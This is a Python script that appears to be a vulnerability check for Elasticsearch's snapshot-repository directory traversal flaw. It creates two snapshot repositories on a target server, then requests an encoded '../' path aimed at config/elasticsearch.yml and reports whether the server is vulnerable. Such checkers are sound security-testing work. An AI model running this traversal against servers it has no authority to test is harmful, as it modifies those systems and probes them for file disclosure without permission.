import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r11=randomLowercase(4)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"_snapshot/"+r11+""
	body='{"type": "fs","settings":{"location": "/usr/share/elasticsearch/repo/'+r11+'"}}'
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.put(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "application/json" in response.headers["Content-Type"] and "{\"acknowledged\":true}" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r0=True
		else:
			r0=False
	else:
		if response.status_code == 200 and "application/json" in response.headers["Content-Type"] and "{\"acknowledged\":true}" in response.text:
			r0=True
		else:
			r0=False
	url=baseurl+"_snapshot/"+r11+"2"
	body='''{\r
    "type": "fs",\r
    "settings":{\r
        "location": "/usr/share/elasticsearch/repo/'''+r11+'''/snapshot-backdata"\r
    }\r
}\r'''
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.put(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "application/json" in response.headers["Content-Type"] and "{\"acknowledged\":true}" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r1=True
		else:
			r1=False
	else:
		if response.status_code == 200 and "application/json" in response.headers["Content-Type"] and "{\"acknowledged\":true}" in response.text:
			r1=True
		else:
			r1=False
	url=baseurl+"_snapshot/"+r11+"/backdata%2f..%2f..%2f..%2fconfig%2felasticsearch.yml"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 400 and "application/json" in response.headers["Content-Type"] and "{\"error\":\"ElasticsearchParseException[Failed to derive xcontent from" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r2=True
		else:
			r2=False
	else:
		if response.status_code == 400 and "application/json" in response.headers["Content-Type"] and "{\"error\":\"ElasticsearchParseException[Failed to derive xcontent from" in response.text:
			r2=True
		else:
			r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
